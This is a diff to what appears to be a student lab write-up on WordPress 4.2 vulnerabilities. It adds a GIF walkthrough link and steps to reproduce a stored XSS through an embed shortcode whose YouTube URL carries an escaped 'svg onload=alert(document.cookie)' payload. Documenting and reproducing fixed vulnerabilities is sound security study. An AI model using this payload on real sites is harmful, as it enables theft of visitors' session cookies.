@@ -13,9 +13,11 @@ Time spent: **X** hours spent in total
     - Vulnerability types: Core vulnerability, Stored XSS
     - Tested in version: 4.2
     - Fixed in version: 4.7.3
-  - [ ] GIF Walkthrough: TODO
+  - [ ] GIF Walkthrough:
+    - ![Gif of 1](https://media.giphy.com/media/w8ZcgIokWUkAmTG9Lq/giphy.gif)
   - [ ] Steps to recreate: 
-    - Test
+    - Copy an embedded youtube URL from any video.
+    - Create embedded link for wordpress with pattern: ``` [embed src='https://www.youtube.com/embed/w0_QVQEbMas\x3csvg onload=alert(document.cookie)\x3e'][/embed] ```
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
 1. (Required) Vulnerability Name or ID
